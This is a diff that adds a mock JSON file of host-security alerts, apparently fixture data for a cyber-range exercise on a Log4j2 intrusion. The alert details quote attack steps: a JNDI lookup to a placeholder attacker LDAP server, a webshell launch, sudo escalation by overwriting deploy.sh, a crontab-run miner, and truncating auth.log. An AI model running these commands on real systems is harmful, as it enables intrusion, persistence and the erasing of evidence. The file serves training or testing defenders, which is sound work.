@@ -1,0 +1,77 @@
+{
+  "RequestId": "mock-range-log4j-rce-alerts",
+  "PageSize": 50,
+  "CurrentPage": 1,
+  "TotalCount": 6,
+  "SuspEvents": [
+    {
+      "AlarmEventName": "Web应用远程代码执行",
+      "AlarmEventType": "Exploit",
+      "AlarmEventNameOriginal": "Log4j2 JNDI RCE",
+      "Level": "serious",
+      "Desc": "检测到通过 Log4j2 JNDI 注入触发远程代码执行，创建 webshell 进程",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "IntranetIp": "__VICTIM_IP__",
+      "SrcIp": "__ATTACKER_IP__",
+      "GmtEvent": "2026-05-06 10:30:00",
+      "Details": "java.naming.InitialContext.lookup(ldap://__ATTACKER_IP__:1389/a) → Exploit.class → python3 webshell.py"
+    },
+    {
+      "AlarmEventName": "恶意脚本执行",
+      "AlarmEventType": "WebShell",
+      "AlarmEventNameOriginal": "Webshell Activity",
+      "Level": "serious",
+      "Desc": "检测到 Python HTTP 服务监听 48888 端口，接收并执行远程命令",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "SrcIp": "__ATTACKER_IP__",
+      "GmtEvent": "2026-05-06 10:31:00",
+      "Details": "python3 /opt/webapp/webshell.py 48888"
+    },
+    {
+      "AlarmEventName": "提权行为",
+      "AlarmEventType": "PrivilegeEscalation",
+      "AlarmEventNameOriginal": "Sudo Privilege Escalation",
+      "Level": "serious",
+      "Desc": "app 用户通过修改可写的 deploy.sh 并利用 sudo NOPASSWD 完成 root 提权",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "GmtEvent": "2026-05-06 10:35:00",
+      "Details": "echo '#!/bin/bash\\nid > /tmp/.uid' > /opt/webapp/deploy.sh && sudo /opt/webapp/deploy.sh"
+    },
+    {
+      "AlarmEventName": "异常进程-挖矿",
+      "AlarmEventType": "CryptoCurrency",
+      "AlarmEventNameOriginal": "Mining Process",
+      "Level": "serious",
+      "Desc": "检测到挖矿行为，进程伪装为 java-gc-helper",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "GmtEvent": "2026-05-06 10:40:00",
+      "Details": "/var/cache/.java-gc (systemd service: java-gc-helper)"
+    },
+    {
+      "AlarmEventName": "持久化后门-Crontab",
+      "AlarmEventType": "Persistence",
+      "AlarmEventNameOriginal": "Crontab Backdoor",
+      "Level": "high",
+      "Desc": "发现可疑 crontab 条目执行隐藏脚本",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "GmtEvent": "2026-05-06 10:41:00",
+      "Details": "*/5 * * * * /var/cache/.java-gc"
+    },
+    {
+      "AlarmEventName": "日志异常清除",
+      "AlarmEventType": "DefenseEvasion",
+      "AlarmEventNameOriginal": "Log Tampering",
+      "Level": "high",
+      "Desc": "auth.log 被异常截断，疑似攻击者清理入侵痕迹",
+      "EventStatus": 1,
+      "InternetIp": "__VICTIM_IP__",
+      "GmtEvent": "2026-05-06 10:45:00",
+      "Details": "truncate -s 0 /var/log/auth.log"
+    }
+  ]
+}
